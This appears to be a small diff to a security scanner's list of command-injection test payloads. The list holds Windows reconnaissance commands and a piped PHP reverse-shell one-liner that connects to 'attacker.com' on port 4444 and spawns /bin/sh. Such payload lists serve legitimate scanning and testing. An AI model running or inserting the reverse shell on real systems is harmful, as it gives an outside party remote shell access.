@@ -564,7 +564,7 @@ class AdvancedScanner:
             "ver",
             "ipconfig /all",
             "net user",
-            "net localgroup adm
+            "net localgroup adm"
             r"| php -r '\$sock=fsockopen(\"attacker.com\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
         ]
 
